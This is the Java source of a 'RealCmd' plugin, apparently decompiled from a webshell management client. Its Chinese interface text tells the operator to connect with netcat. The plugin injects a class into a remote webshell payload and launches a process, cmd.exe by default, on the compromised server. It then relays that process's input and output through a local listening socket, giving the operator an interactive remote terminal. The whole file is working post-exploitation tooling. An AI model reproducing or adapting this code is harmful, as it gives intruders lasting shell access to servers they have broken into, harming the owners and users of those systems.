package shells.plugins.generic;

import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

public abstract class RealCmd implements Plugin {
   private JPanel panel = new JPanel(new BorderLayout());
   private RTextArea tipTextArea = new RTextArea();
   private JButton StartButton = new JButton("Start");
   private JButton StopButton = new JButton("Stop");
   private JLabel hostLabel = new JLabel("BindHost :");
   private JLabel portLabel = new JLabel("BindPort :");
   private JLabel pollingSleepLabel = new JLabel("polling Sleep(ms)");
   private JLabel execFileLabel = new JLabel("exec file");
   private JTextField hostTextField = new JTextField("127.0.0.1", 15);
   private JTextField portTextField = new JTextField("4444", 7);
   private JTextField execFileTextField = new JTextField("cmd.exe", 30);
   private JTextField pollingSleepTextField = new JTextField("1000", 7);
   private JSplitPane realSplitPane = new JSplitPane();
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;
   private ArrayList<Socket> clients;
   private boolean isRuning;
   private ByteArrayOutputStream bufferByteArrayOutputStream;
   private Integer sleepTime;
   private ServerSocket serverSocket;

   public RealCmd() {
      this.tipTextArea.setText(new String(functions.readInputStreamAutoClose(RealCmd.class.getResourceAsStream("assets/realCmd.txt"))));
      this.clients = new ArrayList();
      this.realSplitPane.setOrientation(0);
      this.realSplitPane.setDividerSize(0);
      JPanel realTopPanel = new JPanel();
      realTopPanel.add(this.pollingSleepLabel);
      realTopPanel.add(this.pollingSleepTextField);
      realTopPanel.add(this.execFileLabel);
      realTopPanel.add(this.execFileTextField);
      realTopPanel.add(this.hostLabel);
      realTopPanel.add(this.hostTextField);
      realTopPanel.add(this.portLabel);
      realTopPanel.add(this.portTextField);
      realTopPanel.add(this.StartButton);
      realTopPanel.add(this.StopButton);
      this.realSplitPane.setTopComponent(realTopPanel);
      this.realSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
      this.sleepTime = new Integer(this.pollingSleepTextField.getText());
      this.panel.add(this.realSplitPane);
   }

   public synchronized void StartButtonClick(ActionEvent actionEvent) {
      this.load();
      if (!this.isRuning) {
         int port = Integer.parseInt(this.portTextField.getText());
         String host = this.hostTextField.getText();
         InetSocketAddress socketAddress = this.startRealCmd(port, host, this.execFileTextField.getText(), Integer.parseInt(this.pollingSleepTextField.getText()));
         if (socketAddress != null) {
            String tipStr = String.format("已开启终端请使用netcat连接host:%s,port:%s", socketAddress.getHostName(), socketAddress.getPort());
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), tipStr, "提示", 1);
            Log.log(tipStr);
         } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
         }
      } else {
         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
      }

   }

   public InetSocketAddress startRealCmd(int port, String host, final String cmd, final Integer sleepTime) {
      this.load();
      if (!this.isRuning) {
         try {
            this.isRuning = true;
            this.serverSocket = new ServerSocket(port, 1, InetAddress.getByName(host));
            (new Thread(new Runnable() {
               public void run() {
                  Socket client = null;

                  try {
                     client = RealCmd.this.serverSocket.accept();
                     RealCmd.this.clients.add(client);
                     RealCmd.this.serverSocket.close();
                     RunCmd runCmd = RealCmd.this.new RunCmd(client, sleepTime, RealCmd.this.payload);
                     runCmd.starAndWait(cmd, RealCmd.this.isTryStart());
                     RealCmd.this.clients.remove(client);
                     RealCmd.this.StopButtonClick((ActionEvent)null);
                  } catch (Exception var11) {
                     Log.error((Throwable)var11);
                  } finally {
                     RealCmd.this.isRuning = false;
                     if (client != null && !client.isClosed()) {
                        try {
                           client.close();
                        } catch (IOException var10) {
                           Log.error((Throwable)var10);
                        }
                     }

                  }

               }
            })).start();
            return new InetSocketAddress(this.serverSocket.getInetAddress(), this.serverSocket.getLocalPort());
         } catch (Exception var6) {
            this.isRuning = false;
            Log.error((Throwable)var6);
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var6.getMessage());
         }
      } else {
         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
      }

      return null;
   }

   public void StopButtonClick(ActionEvent actionEvent) {
      this.load();

      try {
         if (this.serverSocket != null && !this.serverSocket.isClosed()) {
            this.serverSocket.close();
         }
      } catch (Exception var4) {
         Log.error((Throwable)var4);
      }

      ReqParameter reqParameter = new ReqParameter();
      reqParameter.add("action", "stop");
      byte[] result = this.payload.evalFunc(this.getClassName(), "realCmd", reqParameter);
      if (Arrays.equals("ok".getBytes(), result)) {
         GOptionPane.showMessageDialog(this.getView(), "stop ok", "提示", 1);
      } else if (result != null) {
         GOptionPane.showMessageDialog(this.getView(), this.encoding.Decoding(result), "提示", 2);
      } else {
         GOptionPane.showMessageDialog(this.getView(), "fail", "提示", 2);
      }

      this.isRuning = false;
   }

   private void load() {
      if (!this.loadState) {
         try {
            if (this.payload.include(this.getClassName(), this.readPlugin())) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var2) {
            Log.error((Throwable)var2);
         }
      }

   }

   public boolean isTryStart() {
      return false;
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(RealCmd.class, this, RealCmd.class, this);
   }

   public void closePlugin() {
      this.clients.stream().forEach((socket) -> {
         if (!socket.isClosed()) {
            try {
               if (!socket.isClosed()) {
                  socket.close();
               }

               this.StopButtonClick((ActionEvent)null);
            } catch (IOException var3) {
               Log.error((Throwable)var3);
            }
         }

      });
   }

   public JPanel getView() {
      return this.panel;
   }

   public abstract byte[] readPlugin();

   public abstract String getClassName();

   class RunCmd {
      Payload payload;
      int errNum;
      Lock lock = new ReentrantLock();
      OutputStream outputStream;
      InputStream inputStream;
      Integer sleepTime;
      boolean alive;
      Thread ioThread;
      Thread oiThread;
      Socket socket;

      public RunCmd(Socket socket, Integer sleepTime, Payload payload) {
         try {
            this.alive = true;
            this.socket = socket;
            this.inputStream = socket.getInputStream();
            this.outputStream = socket.getOutputStream();
            this.payload = payload;
            this.sleepTime = sleepTime;
            this.oiThread = new Thread(() -> {
               try {
                  this.startOI();
               } catch (Exception var9) {
                  try {
                     if (!socket.isClosed()) {
                        socket.close();
                     }
                  } catch (IOException var8) {
                     var8.printStackTrace();
                  }

                  Log.error((Throwable)var9);
               } finally {
                  this.alive = false;
               }

            });
            this.ioThread = new Thread(() -> {
               try {
                  this.startIO();
               } catch (Exception var9) {
                  try {
                     if (!socket.isClosed()) {
                        socket.close();
                     }
                  } catch (IOException var8) {
                     var8.printStackTrace();
                  }

                  Log.error((Throwable)var9);
               } finally {
                  this.alive = false;
               }

            });
         } catch (Exception var6) {
            Log.error((Throwable)var6);
         }

      }

      public void starAndWait(String commandStr, boolean isTryStrat) throws Exception {
         ReqParameter parameter = new ReqParameter();
         parameter.add("action", "start");
         parameter.add("cmdLine", RealCmd.this.encoding.Encoding(commandStr));
         String[] commandArgs = functions.SplitArgs(commandStr);

         for(int i = 0; i < commandArgs.length; ++i) {
            parameter.add(String.format("arg-%d", i), RealCmd.this.encoding.Encoding(commandArgs[i]));
         }

         parameter.add("argsCount", String.valueOf(commandArgs.length));
         String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
         if (executableArgs.length > 0) {
            parameter.add("executableFile", executableArgs[0]);
            if (executableArgs.length >= 2) {
               parameter.add("executableArgs", executableArgs[1]);
            }
         }

         if (!isTryStrat) {
            byte[] res = this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", parameter);
            if (res != null) {
               this.outputStream.write(res);
               if (Arrays.equals("ok".getBytes(), res)) {
                  this.ioThread.start();
                  this.oiThread.start();
                  this.oiThread.join();
                  this.closeSocket();
                  this.ioThread.join();
                  this.closeSocket();
               }
            }
         } else {
            (new Thread(() -> {
               this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", parameter);
            })).start();
            Thread.sleep(1500L);
            this.ioThread.start();
            this.oiThread.start();
            this.oiThread.join();
            this.closeSocket();
            this.ioThread.join();
            this.closeSocket();
         }

      }

      private void startIO() throws Exception {
         byte[] buffer = new byte[521];
         int readNum = true;

         int readNumx;
         while((readNumx = this.inputStream.read(buffer)) != -1 && this.alive) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("action", "processWriteData");
            reqParameter.add("processWriteData", Arrays.copyOf(buffer, readNumx));
            byte[] res = this.sendHandle(reqParameter);
            if (res != null) {
               if (res.length == 0) {
                  return;
               }

               if (res[0] != 5) {
                  this.writeToClientStream(res, true);
                  Log.error(String.format("RealCmd processWriteDataErr :%s", new String(res)));
                  return;
               }

               this.writeToClientStream(Arrays.copyOfRange(res, 1, res.length), false);
            }
         }

      }

      private void startOI() throws Exception {
         while(true) {
            if (this.alive) {
               Thread.sleep(this.sleepTime.longValue());
               ReqParameter reqParameter = new ReqParameter();
               reqParameter.add("action", "getResult");
               byte[] res = this.sendHandle(reqParameter);
               if (res == null) {
                  continue;
               }

               if (res.length == 0) {
                  return;
               }

               if (res[0] == 5) {
                  this.writeToClientStream(Arrays.copyOfRange(res, 1, res.length), false);
                  continue;
               }

               this.writeToClientStream(res, true);
               Log.error(String.format("RealCmd processWriteDataErr :%s", new String(res)));
               return;
            }

            return;
         }
      }

      public void writeToClientStream(byte[] data, boolean canEncode) throws IOException {
         if (canEncode) {
            this.outputStream.write(RealCmd.this.encoding.Decoding(data).getBytes());
         } else {
            this.outputStream.write(data);
         }

      }

      public byte[] sendHandle(ReqParameter reqParameter) {
         if (this.errNum > 10) {
            return "The number of errors exceeded the limit".getBytes();
         } else {
            this.lock.lock();
            byte[] ret = null;

            try {
               ret = this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", reqParameter);
               this.errNum = 0;
            } catch (Exception var4) {
               ++this.errNum;
               Log.error((Throwable)var4);
            }

            this.lock.unlock();
            return ret;
         }
      }

      public void closeSocket() {
         try {
            if (this.socket != null && !this.socket.isClosed()) {
               this.socket.close();
            }
         } catch (Exception var2) {
            Log.error((Throwable)var2);
         }

      }
   }
}
